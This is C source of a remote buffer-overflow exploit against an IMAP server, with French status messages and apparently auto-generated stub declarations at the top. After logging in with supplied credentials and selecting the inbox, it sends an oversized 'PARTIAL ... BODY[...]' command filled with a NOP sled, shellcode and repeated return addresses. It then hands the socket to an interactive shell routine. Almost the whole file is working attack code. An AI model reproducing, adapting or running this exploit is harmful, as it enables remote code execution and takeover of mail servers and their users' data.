#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  sin_addr; } ;
struct sockaddr {int dummy; } ;
struct servent {int /*<<< orphan*/  s_port; } ;
struct hostent {int /*<<< orphan*/  h_addrtype; int /*<<< orphan*/  h_length; int /*<<< orphan*/  h_addr; } ;
typedef  int /*<<< orphan*/  server ;
typedef  int /*<<< orphan*/  imap_info ;
typedef  int /*<<< orphan*/  buffer ;

/* Variables and functions */
 int /*<<< orphan*/  DEFAULT_PROTOCOL ; 
 int ERROR_EXIT ; 
 int GOOD_EXIT ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  bcopy (int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  bzero (char*,int) ; 
 int /*<<< orphan*/  close (int) ; 
 scalar_t__ connect (int,struct sockaddr*,int) ; 
 struct hostent* gethostbyname (char*) ; 
 struct servent* getservbyname (char*,char*) ; 
 int imap_receive (int,char*,int) ; 
 int imap_send (int,char*) ; 
 int interact (int) ; 
 int /*<<< orphan*/  memcpy (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  memset (char*,int,int) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  sc ; 
 int /*<<< orphan*/  shutdown (int,int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*,...) ; 
 int /*<<< orphan*/  strlen (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/ * strstr (char*,char*) ; 
 int strtoul (char*,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  usage (char*) ; 

int main(int argc, char *argv[])
{
  struct sockaddr_in server;
  struct servent *sp;
  struct hostent *hp;
  int s, i , ret, align;
  int blaw = 1024;
  char *user, *passwd;

  char imap_info[4096];
  char imap_login[4096];
  char imap_query[4096];
  char buffer[2048];

  int exit_code = GOOD_EXIT;

  if (argc != 6) usage(argv[0]);

  user = argv[2];
  passwd = argv[3];
  ret = strtoul(argv[4], NULL, 16);
  align = atoi(argv[5]);

  if ((hp = gethostbyname(argv[1])) == NULL)
    exit_code = ERROR_EXIT;

  if ((exit_code == GOOD_EXIT) && (sp = getservbyname("imap2", "tcp")) ==
NULL)
    exit_code = ERROR_EXIT;

  if (exit_code == GOOD_EXIT) {
    if ((s = socket(PF_INET, SOCK_STREAM, DEFAULT_PROTOCOL)) < 0)
      return exit_code = ERROR_EXIT;

    bzero((char *) &server, sizeof(server));
    bcopy(hp->h_addr, (char *) &server.sin_addr, hp->h_length);
    server.sin_family = hp->h_addrtype;
    server.sin_port = sp->s_port;
    if (connect(s, (struct sockaddr *) &server, sizeof(server)) < 0)
      exit_code = ERROR_EXIT;
    else {
      printf(" [1;34mV�rification de la banni�re : [0m\n");
      if (exit_code = imap_receive(s, imap_info, sizeof(imap_info)) ==
ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }

      printf("%s", imap_info);
      if (strstr(imap_info, "IMAP4rev1 200") == NULL) {
        printf(" [1;32mService IMAPd non reconnu ... [0m\n");
        shutdown(s, 2);
        close(s);
        return exit_code;
      }

      if ((exit_code = imap_send(s, "x CAPABILITY\n")) == ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }

      printf(" [1;34mV�rification des options du service : [0m\n");
      if ((exit_code = imap_receive(s, imap_info, sizeof(imap_info))) ==
ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }

      printf("%s", imap_info);
      if (strstr(imap_info, " IMAP4 ") == NULL) {
        printf(" [1;32mService IMAPd non vuln�rable ... [0m\n");
        shutdown(s, 2);
        close(s);
        return exit_code;
      }

      printf(" [1;31mService IMAPd vuln�rable ... [0m\n");
      sprintf(imap_login, "x LOGIN %s %s\n", user, passwd);
      if ((exit_code = imap_send(s, imap_login)) == ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }

      if ((exit_code = imap_receive(s, imap_info, sizeof(imap_info))) ==
ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }
      printf("%s", imap_info);

      if ((exit_code = imap_send(s, "x SELECT Inbox\n")) == ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }

      if ((exit_code = imap_receive(s, imap_info, sizeof(imap_info))) ==
ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }
      printf("%s", imap_info);

      memset(buffer, 0x90, sizeof(buffer));
      memcpy(buffer + 512, sc, strlen(sc));

      for (i = blaw + align ; i < 1096; i +=4)
        *(unsigned int *)(&buffer[i]) = ret;

      *(unsigned int *)(&buffer[i + 1]) = 0;

      sprintf(imap_query, "x PARTIAL 1 BODY[%s] 1 1\n", buffer);
      if ((exit_code = imap_send(s, imap_query)) == ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }

      if ((exit_code = imap_receive(s, imap_info, sizeof(imap_info))) ==
ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }

      if ((exit_code = imap_send(s, "x LOGOUT\n")) == ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }

      if ((exit_code = imap_receive(s, imap_info, sizeof(imap_info))) ==
ERROR_EXIT) {
        shutdown(s, 2);
        close(s);
        return exit_code;
      }
    }
  }

      i = interact( s );

  return exit_code;
}